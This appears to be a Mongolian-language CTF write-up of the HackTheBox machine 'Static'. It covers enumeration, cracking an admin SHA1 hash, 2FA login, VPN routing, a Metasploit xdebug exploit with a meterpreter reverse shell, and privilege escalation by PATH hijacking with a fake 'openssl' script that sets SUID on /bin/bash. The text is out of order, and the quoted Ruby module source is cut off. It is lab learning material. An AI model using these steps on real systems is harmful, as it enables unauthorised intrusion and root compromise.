s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1977 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1979 | openssl req -in /opt/easyrsa/pki/reqs/a.req -noout -subject -nameopt multiline 2021/06/25 02:46:35 CMD: UID=0 PID=1978 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1980 | cat /opt/easyrsa/x509-types/COMMON 2021/06/25 02:46:35 CMD: UID=0 PID=1983 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1984 | awk BEGIN {IGNORECASE=1; r=2} { if(match($0,\"no\")) {r=1; exit} if(match($0,\"yes\")) {r=0; exit} } END {exit r} 2021/06/25 02:46:35 CMD: UID=0 PID=1985 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1987 | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/a.req -out /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch 2021/06/25 02:46:35 CMD: UID=0 PID=1988 | mv /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY /opt/easyrsa/pki/issued/a.crt Openssl -г compile хийх болгондоо root access ашиглаад байсан юм шиг байгаа. Тэгээд openssl -г root рүү ороход trigger болгож ашиглахад зориулж /bin/bash бэлдэж өгөөд -p -г ашиглаад /root - dir рүү хандаж болгох.\nopenssl нэртэй файл үүсгээд дотор нь:\n**#!/bin/bash** chmod u+s /bin/bash base64 рүү:\n┌─[ca4mi@ca4mi-virtualbox]─[~/Documents/htb/machine/static/www/cheat] └──╼ $cat openssl | base64 IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= pki дотор decode хийнэ\necho \"IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=\" | base64 -d \u003e openssl cat openssl #!/bin/bash chmod u+s /bin/bash Permission нэмэх:\nchmod 755 openssl Path үүсгээд дотор openssl хийгээд доор байгааг ажилуулна:\nexport PATH=/tmp/pwn:$PATH echo $PATH /tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Ersatool ажилууллахаар usr/bin/spin давхар ажиллаж байгааг ашиглах. Тэгээд create, delete, a, b, c гээд үүсгэж байгаад доор /bin/bash -н permission suid болж байгааг ажилгана.\nwww-data@pki:/tmp/pwn$ ls -al /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash www-data@pki:/tmp/pwn$ /bin/bash -p bash-4.4# cd /root/ bash-4.4# ls notes.txt root.txt ","wordCount":"2865","inLanguage":"mn","datePublished":"2024-02-22T00:00:00Z","dateModified":"2024-02-22T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-02-22-htb-static-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Архив><span>Архив</span></a></li><li><a href=https://cadil.github.io/search/ title=Хайлт><span>Хайлт</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Static</h1><div class=post-description>HTB - Static - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-02-22 00:00:00 +0000 UTC'>хоёрдугаар сар 22, 2024</span>&nbsp;·&nbsp;14 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-fixgz aria-label="4. fixgz">4. fixgz</a></li><li><a href=#5-hash aria-label="5. Hash">5. Hash</a></li><li><a href=#6-2fa aria-label="6. 2FA">6. 2FA</a></li><li><a href=#7-ovpn aria-label="7. OVPN">7. OVPN</a></li><li><a href=#7-metasploit---xdebug aria-label="7. Metasploit - xdebug">7. Metasploit - xdebug</a></li><li><a href=#8-privilege-escalation aria-label="8. Privilege escalation">8. Privilege escalation</a></li></ul></div></details></div><div class=post-content><p><strong>PS</strong>: Үүсгэсэн огноо: 2021 оны 11-р сарын 6~9 өдрүүдэд бичсэн тэмдэглэл юм.</p><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><pre tabindex=0><code># Machine Address
10.10.10.246

# Local Address
10.10.14.22
</code></pre><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sC -sV -oA nmap/static 10.10.10.246
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-11-06 00:31 EDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.246
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.21s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> filtered ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8080/tcp open  http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#ae81ff>2</span> disallowed entries 
</span></span><span style=display:flex><span>|_/vpn/ /.ftp_uploads/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html; charset<span style=color:#f92672>=</span>UTF-8<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.10.246:8080/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style=color:#ae81ff>50</span> -x .php,txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.10.246:8080/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php,txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/06 00:36:53 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/robots.txt           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 55<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>117513</span> / <span style=color:#ae81ff>661683</span> <span style=color:#f92672>(</span>17.76%<span style=color:#f92672>)</span>           ^C
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Keyboard interrupt detected, terminating.
</span></span><span style=display:flex><span>                                              
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/06 00:44:47 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>Robot.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>User-agent: *
</span></span><span style=display:flex><span>Disallow: /vpn/
</span></span><span style=display:flex><span>Disallow: /.ftp_uploads/
</span></span></code></pre></div><h3 id=4-fixgz>4. fixgz<a hidden class=anchor aria-hidden=true href=#4-fixgz>#</a></h3><p>Git -с clone:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/yonjar/fixgz.git
</span></span></code></pre></div><p>cpp compile:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>g++ fixgz.cpp -o fixgz
</span></span></code></pre></div><p>broken gz засах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./fixgz db.sql.gz db.gz
</span></span></code></pre></div><p>Unzip:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gunzip db.gz
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat db
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>CREATE DATABASE static;
</span></span><span style=display:flex><span>USE static;
</span></span><span style=display:flex><span>CREATE TABLE users <span style=color:#f92672>(</span> id smallint unsigned not null auto_increment, username varchar<span style=color:#f92672>(</span>20<span style=color:#f92672>)</span> not null, password varchar<span style=color:#f92672>(</span>40<span style=color:#f92672>)</span> not null, totp varchar<span style=color:#f92672>(</span>16<span style=color:#f92672>)</span> not null, primary key <span style=color:#f92672>(</span>id<span style=color:#f92672>)</span> <span style=color:#f92672>)</span>; 
</span></span><span style=display:flex><span>INSERT INTO users <span style=color:#f92672>(</span> id, username, password, totp <span style=color:#f92672>)</span> VALUES <span style=color:#f92672>(</span> null, <span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#e6db74>&#39;d033e22ae348aeb5660fc2140aec35850c4da997&#39;</span>, <span style=color:#e6db74>&#39;orxxi4c7orxwwzlo&#39;</span> <span style=color:#f92672>)</span>;
</span></span></code></pre></div><h3 id=5-hash>5. Hash<a hidden class=anchor aria-hidden=true href=#5-hash>#</a></h3><p>hash:</p><pre tabindex=0><code>d033e22ae348aeb5660fc2140aec35850c4da997
</code></pre><p>Файл болгов:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>vi hash
</span></span><span style=display:flex><span>d033e22ae348aeb5660fc2140aec35850c4da997
</span></span></code></pre></div><p>Hash тайлах:</p><pre tabindex=0><code>john hash
</code></pre><p>Output:</p><pre tabindex=0><code>Created directory: /home/ca4mi/.john
Warning: detected hash type &#34;Raw-SHA1&#34;, but the string is also recognized as &#34;Raw-SHA1-AxCrypt&#34;
Use the &#34;--format=Raw-SHA1-AxCrypt&#34; option to force loading these as that type instead
Warning: detected hash type &#34;Raw-SHA1&#34;, but the string is also recognized as &#34;Raw-SHA1-Linkedin&#34;
Use the &#34;--format=Raw-SHA1-Linkedin&#34; option to force loading these as that type instead
Warning: detected hash type &#34;Raw-SHA1&#34;, but the string is also recognized as &#34;ripemd-160&#34;
Use the &#34;--format=ripemd-160&#34; option to force loading these as that type instead
Warning: detected hash type &#34;Raw-SHA1&#34;, but the string is also recognized as &#34;has-160&#34;
Use the &#34;--format=has-160&#34; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Proceeding with single, rules:Single
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
admin            (?)
1g 0:00:00:00 DONE 2/3 (2021-11-06 01:01) 20.00g/s 56480p/s 56480c/s 56480C/s abbott..admin1
Use the &#34;--show --format=Raw-SHA1&#34; options to display all of the cracked passwords reliably
Session completed
</code></pre><p><code>admin</code></p><h3 id=6-2fa>6. 2FA<a hidden class=anchor aria-hidden=true href=#6-2fa>#</a></h3><p>Machine, HTB-н VPN нарын цагийн бүс адилхан байх хэрэгтэй юм билээ. HTB дээрх сервер zone сольж ороод дахин үзсэн.</p><p>/vpn/login.php:
2FA нэхэж байгаа
<a href=https://addons.mozilla.org/en-US/firefox/addon/auth-helper/>https://addons.mozilla.org/en-US/firefox/addon/auth-helper/</a> - татаж аваад entry оруулаад орсон.</p><p>http://10.10.10.246:8080/vpn/panel.php</p><h3 id=7-ovpn>7. OVPN<a hidden class=anchor aria-hidden=true href=#7-ovpn>#</a></h3><p>Support хэсгээс web - vpn татаж аваад ажилууллна.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>openvpn web.ovpn
</span></span></code></pre></div><p>Оutput:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>2021-11-06 04:25:07 Outgoing Control Channel Authentication: Using <span style=color:#ae81ff>160</span> bit message hash <span style=color:#e6db74>&#39;SHA1&#39;</span> <span style=color:#66d9ef>for</span> HMAC authentication
</span></span><span style=display:flex><span>2021-11-06 04:25:07 Incoming Control Channel Authentication: Using <span style=color:#ae81ff>160</span> bit message hash <span style=color:#e6db74>&#39;SHA1&#39;</span> <span style=color:#66d9ef>for</span> HMAC authentication
</span></span><span style=display:flex><span>2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 <span style=color:#f92672>(</span>Name or service not known<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2021-11-06 04:25:07 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 <span style=color:#f92672>(</span>Name or service not known<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2021-11-06 04:25:07 Could not determine IPv4/IPv6 protocol
</span></span><span style=display:flex><span>2021-11-06 04:25:07 SIGUSR1<span style=color:#f92672>[</span>soft,init_instance<span style=color:#f92672>]</span> received, process restarting
</span></span><span style=display:flex><span>2021-11-06 04:25:07 Restart pause, <span style=color:#ae81ff>40</span> second<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2021-11-06 04:25:47 Outgoing Control Channel Authentication: Using <span style=color:#ae81ff>160</span> bit message hash <span style=color:#e6db74>&#39;SHA1&#39;</span> <span style=color:#66d9ef>for</span> HMAC authentication
</span></span><span style=display:flex><span>2021-11-06 04:25:47 Incoming Control Channel Authentication: Using <span style=color:#ae81ff>160</span> bit message hash <span style=color:#e6db74>&#39;SHA1&#39;</span> <span style=color:#66d9ef>for</span> HMAC authentication
</span></span><span style=display:flex><span>2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 <span style=color:#f92672>(</span>Name or service not known<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2021-11-06 04:25:47 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 <span style=color:#f92672>(</span>Name or service not known<span style=color:#f92672>)</span>
</span></span></code></pre></div><p><code>vpn.static.htb</code> - танихгүй байгаа. <code>etc/hosts</code> дотор нэмэх.
<code>172.20.0.10</code> - browser-с хандалт авахгүй байна.</p><p>ifconfig:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tun9: flags<span style=color:#f92672>=</span>4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
</span></span><span style=display:flex><span>        inet6 fe80::9198:489e:ac83:105  prefixlen <span style=color:#ae81ff>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen <span style=color:#ae81ff>500</span>  <span style=color:#f92672>(</span>UNSPEC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>0</span>  bytes <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>0.0 B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>4</span>  bytes <span style=color:#ae81ff>192</span> <span style=color:#f92672>(</span>192.0 B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>tun9 -г route руу access хийнэ. Ингэснээр <code>172.30.0.9 -> 172.20.0.0/24</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ip route add 172.20.0.0/24 dev tun9
</span></span></code></pre></div><p>/Host/ Parrot OS - ip route add хийхэд sudo шаардсан. sudo-г нэмсэн.</p><h3 id=7-metasploit---xdebug>7. Metasploit - xdebug<a hidden class=anchor aria-hidden=true href=#7-metasploit---xdebug>#</a></h3><p>info.php ороод <code>xdebug</code> байгаа.
<code>Version: 2.6.0</code></p><p>metasploit:
<a href=https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/>https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/</a>
metasploit run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo msfdb run
</span></span></code></pre></div><p>Тохируулга хийх:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>use exploit/unix/http/xdebug_unauth_exec
</span></span><span style=display:flex><span>set PATH /vpn/login.php
</span></span><span style=display:flex><span>set RHOSTS 172.20.0.10
</span></span><span style=display:flex><span>set LHOST tun9
</span></span><span style=display:flex><span>set LPORT <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><p>Тохиргоо:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/unix/http/xdebug_unauth_exec<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   PATH     /vpn/login.php   yes       Path to target webapp
</span></span><span style=display:flex><span>   Proxies                   no        A proxy chain of format type:host:port<span style=color:#f92672>[</span>,type:host:port<span style=color:#f92672>][</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   RHOSTS   172.20.0.10      yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, range CIDR identifier, or hosts file with syntax <span style=color:#e6db74>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span style=display:flex><span>   RPORT    <span style=color:#ae81ff>80</span>               yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   SRVHOST  0.0.0.0          yes       Callback host <span style=color:#66d9ef>for</span> accepting connections
</span></span><span style=display:flex><span>   SRVPORT  <span style=color:#ae81ff>9000</span>             yes       Port to listen <span style=color:#66d9ef>for</span> the debugger
</span></span><span style=display:flex><span>   SSL      false            no        Negotiate SSL/TLS <span style=color:#66d9ef>for</span> outgoing connections
</span></span><span style=display:flex><span>   VHOST                     no        HTTP server virtual host
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>php/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  tun9             yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>9001</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Automatic
</span></span></code></pre></div><p>Ажилууллах</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run
</span></span></code></pre></div><p><code>1500 -> 1200</code> болгож үзсэн, exploit болохгүй байсан болохоор connection-д асуудал байна уу. Гэхдээ болоогүй.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ifconfig tun0 mtu <span style=color:#ae81ff>1200</span>
</span></span></code></pre></div><p>metaexploit -с нь биш шууд ruby ажилууллах гэж үзсэн. Болоогүй.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This module requires Metasploit: https://metasploit.com/download</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Current source: https://github.com/rapid7/metasploit-framework</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MetasploitModule</span> <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>Rank</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>ExcellentRanking</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Tcp</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HttpClient</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Proto</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Http</span>
</span></span><span style=display:flex><span>
